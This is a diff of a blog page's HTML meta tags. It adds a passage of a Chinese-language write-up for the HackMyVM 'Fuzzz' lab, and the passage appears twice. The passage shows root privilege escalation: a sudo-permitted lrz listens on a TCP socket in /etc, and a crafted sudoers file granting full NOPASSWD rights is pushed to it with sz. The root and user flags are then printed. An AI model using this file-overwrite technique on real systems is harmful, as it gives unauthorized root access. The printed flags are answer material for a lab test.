@@ -684,7 +684,53 @@ lrz用于通过 ZMODEM/YMODEM/XMODEM 协议接收文件
 -C, --allow-remote-commands allow execution of remote commands (Z)
 ```
 
-这个选项的字面意思就是“**允许执行远程命令**”。">
+这个选项的字面意思就是“**允许执行远程命令**”。
+
+然后扒拉了很久，都没行
+
+我也尝试了上传文件覆盖，但是应该是我Tabby有问题，覆盖不了
+
+后面看到
+
+```
+--tcp-server            open socket, wait for connection (Z)
+```
+
+so
+
+```
+fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server
+connect with lrz --tcp-client 'fuzzz.hmv:46143'
+```
+
+kali
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cat sudoers
+asahi ALL=(ALL:ALL) NOPASSWD: ALL
+                                         
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sz --tcp-client 192.168.205.163:46143 -y sudoers
+connecting to [192.168.205.163] <46143>
+```
+
+靶机弹出了
+
+```
+lrz waiting to receive.fuzzz:/etc$ sudo -l
+User asahi may run the following commands on fuzzz:
+    (ALL : ALL) NOPASSWD: ALL
+fuzzz:/etc$ sudo su
+/etc # id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/etc # cat /root/root.flag 
+flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
+/etc # cat /home/asahi/user.flag 
+flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
+```
+
+sentence">
 <meta property="og:title" content="hmv_Fuzzz">
 <meta property="og:description" content="```
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
@@ -1363,7 +1409,53 @@ lrz用于通过 ZMODEM/YMODEM/XMODEM 协议接收文件
 -C, --allow-remote-commands allow execution of remote commands (Z)
 ```
 
-这个选项的字面意思就是“**允许执行远程命令**”。">
+这个选项的字面意思就是“**允许执行远程命令**”。
+
+然后扒拉了很久，都没行
+
+我也尝试了上传文件覆盖，但是应该是我Tabby有问题，覆盖不了
+
+后面看到
+
+```
+--tcp-server            open socket, wait for connection (Z)
+```
+
+so
+
+```
+fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server
+connect with lrz --tcp-client 'fuzzz.hmv:46143'
+```
+
+kali
+
+```
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cat sudoers
+asahi ALL=(ALL:ALL) NOPASSWD: ALL
+                                         
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sz --tcp-client 192.168.205.163:46143 -y sudoers
+connecting to [192.168.205.163] <46143>
+```
+
+靶机弹出了
+
+```
+lrz waiting to receive.fuzzz:/etc$ sudo -l
+User asahi may run the following commands on fuzzz:
+    (ALL : ALL) NOPASSWD: ALL
+fuzzz:/etc$ sudo su
+/etc # id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/etc # cat /root/root.flag 
+flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
+/etc # cat /home/asahi/user.flag 
+flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
+```
+
+sentence">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_Fuzzz.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
